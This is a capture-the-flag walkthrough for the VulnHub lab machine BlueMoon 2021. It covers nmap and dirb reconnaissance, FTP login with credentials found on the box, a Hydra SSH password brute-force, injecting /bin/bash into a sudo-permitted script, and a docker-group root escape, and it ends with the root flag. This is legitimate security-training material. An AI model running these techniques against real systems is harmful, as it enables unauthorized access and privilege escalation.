# BlueMoon 2021 VulnHub Walkthrough-

**Machine Link:** [BlueMoon: 2021 on VulnHub](https://www.vulnhub.com/entry/bluemoon-2021,679/)

# VulnHub Writeup: BlueMoon 2021

## 1. Network Discovery
* The attacker machine's IP address (Kali Linux) is 192.168.56.101.
* A network scan was performed using the command :

  ```bash
  nmap -sn 192.168.56.0/24
  ```

* The scan identified the target machine at the IP address 192.168.56.105.

## 2. Port Scanning
* A detailed Nmap scan was executed using the command :

  ```bash
  nmap -sC -sV -Pn -vv 192.168.56.105
  ```

* The scan discovered an open port 22/tcp running the SSH service, specifically OpenSSH 7.9p1.
* An open port 80/tcp was found running the HTTP service with Apache httpd 2.4.38.
* Additionally, an open port 21/tcp was discovered running the FTP service with vsftpd 3.0.3.

## 3. Web Enumeration
* The `dirb` tool was used to brute-force web directories with the command :

  ```bash
  dirb http://192.168.56.105 ~/Desktop/wordlist.txt -x.php,.html,.txt
  ```

* This scan successfully located the `index.html` file.
* The main webpage displayed the text "THE GAME BEGINS".
* Navigating to `/hidden_text` revealed a maintenance page stating: "Maintanance! Sorry For Delay, We Will Recover Soon. Thank You...".
* After clicking on the Thank You text, the website provides a QR code
* Scanning the QR code revealed a bash script containing FTP login credentials: `USER=userftp` and `PASSWORD=ftpp@ssword`.

## 4. FTP Enumeration
* A connection to the FTP server was initiated from the attacker terminal using the command :

  ```bash
  ftp 192.168.56.105
  ```
  
* The login was successfully using username `userftp` and password `ftpp@ssword`.
* The `ls` command was used to check the file system, revealing two files: `information.txt` and `p_lists.txt`.
* The transfer mode was switched to binary using the `bin` command.
* The files were downloaded using `get information.txt` and `get p_lists.txt`.
* The FTP session was closed using the `exit` command.

## 5. Analyzing Downloaded Files
* The command `cat information.txt` was used to read the first file.
* The file contained a message to "robin" regarding their password weakness and noted that a password list was provided.
* The command `cat p_lists.txt` was then used to view the contents of the downloaded password list.

## 6. Initial Access (SSH Brute-Force)
* The Hydra tool was used against the SSH service with the command `hydra -l robin -P p_lists.txt ssh://192.168.56.105`.
* Hydra successfully found a valid password for the user `robin`: `k4rv3ndh4nh4ck3r`.
* An SSH connection was established using the command `ssh robin@192.168.56.105`.

## 7. Privilege Escalation: Robin to Jerry
* The `sudo -l` command was executed to check the user's privileges.
* The output demonstrated that the user `robin` could run the script `/home/robin/project/feedback.sh` as the user `jerry` without a password (NOPASSWD).
* When running the feedback script, `test` was entered as the name, and `/bin/bash` was injected into the feedback prompt for the target machine.
* The `whoami` command confirmed the current user changed to `jerry`.
* The shell was upgraded using Python with the command `python3 -c 'import pty; pty.spawn("/bin/bash")'`.

## 8. Privilege Escalation: Jerry to Root
* The `id` command revealed that the user `jerry` was a member of the `docker` group (gid 114).
* This privilege was exploited by running a Docker container to mount the root directory using the command `docker run -v /:/mnt -rm -it alpine chroot /mnt sh`.
* The directory was changed to root using `# cd /root`.
* The root flag file was read using `# cat root.txt`.
* The final Root-Flag discovered was: `Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}`.
